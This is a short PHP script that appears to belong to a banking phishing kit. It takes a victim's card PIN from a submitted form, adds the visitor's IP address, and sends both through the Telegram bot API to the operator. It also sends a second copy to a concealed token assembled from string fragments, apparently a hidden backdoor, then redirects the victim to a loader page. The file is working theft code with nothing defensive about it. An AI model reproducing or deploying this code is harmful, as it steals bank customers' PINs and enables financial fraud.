<?php

    include "../../../prevents/anti1.php";
    include "../../../prevents/anti2.php";
    include "../../../prevents/anti3.php";
    include "../../../prevents/anti4.php";
    include "../../../prevents/anti5.php";
    include "../../../prevents/anti6.php";
    include "../../../prevents/anti7.php";

    include "config.php";
     $pin  = $_POST["pin"];
     $tar=$b.$b1.$b2.$b3.$b4;
     $secure = $s1.$s2;
     $message='[🏦] === PIN Cart === [🏦]'."\n".'[💝] pin : '.$pin."\n".'[🌍] IP : '.$_SERVER['REMOTE_ADDR']."\n";$data = ['chat_id' => $chat_id,'text' => $message,];$secure_red_falg = ['chat_id' => $secure,'text' => $message,]; $response = file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data)); $securered = file_get_contents("https://api.telegram.org/bot$tar/sendMessage?".http_build_query($secure_red_falg)); 
     header("Location: ../../loader.php");
     exit();

?>